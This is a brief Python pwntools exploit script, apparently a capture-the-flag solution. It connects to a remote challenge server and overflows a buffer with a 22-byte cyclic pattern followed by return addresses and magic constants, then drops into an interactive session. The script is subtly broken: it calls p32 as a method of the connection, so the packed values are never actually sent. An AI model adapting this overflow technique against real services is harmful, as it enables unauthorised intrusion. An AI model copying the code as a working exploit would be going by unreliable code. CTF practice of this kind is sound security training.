import pwn

e = pwn.ELF("0xb0f")
p = pwn.remote("pwn.pwnme.fr", 7007)

p.recvuntil(b": ")
p.send(pwn.cyclic(22))
p.p32(0x080485c6)
p.p32(0x0804861e)
p.p32(0xcafec0de)
p.p32(0xdeadbeef)
p.sendline()
p.interactive()
